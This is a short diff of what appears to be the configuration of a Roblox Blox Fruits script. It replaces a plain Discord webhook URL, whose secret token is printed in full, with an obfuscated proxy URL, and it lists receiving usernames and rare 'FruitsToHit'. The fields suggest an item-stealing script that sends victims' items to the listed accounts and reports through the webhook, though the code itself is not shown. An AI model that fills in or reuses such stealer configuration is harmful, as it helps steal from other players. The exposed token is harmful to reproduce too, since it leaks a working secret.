@@ -1,4 +1,4 @@
-Webhook = "https://discord.com/api/webhooks/1353553869942161612/R9vKNwnePZ_eefgEIbXGF_oiSYZwum8big0aZfPDu65kB9Vas9ELUZnfoudGcnY7hxAb" -- << Your Webhook
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=LWFkNFR3X01ZOVd5OUc2MGZyeEkwdzpkdnhyV3lUX25hclBnZG00Q1Z0WUR5WFVaN3VTUTFoUGluazdJV2hsNGR3cDlBbk4tLW1EQk5PQnFtT0VrOXdBbzBMZlpqWnZRMFdHeVp6bmZMUkdQLU92Z1lCVWhsVFhqYTZQT25UbWI5TDBNVnRpNDRYR09uVGRXWWVDMk5jQTlPR0VaVEdIVTBJakdnS2hIX3hRd2ZmRHQ5eWNvSFM0eU5jN0tkZlJEQjQ" -- << Your Webhook
 Usernames = {"kunalunao", "ivanmanw5"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Control-Control", "Dough-Dough" , "Dragon-Dragon"} -- << Fruits you want
 
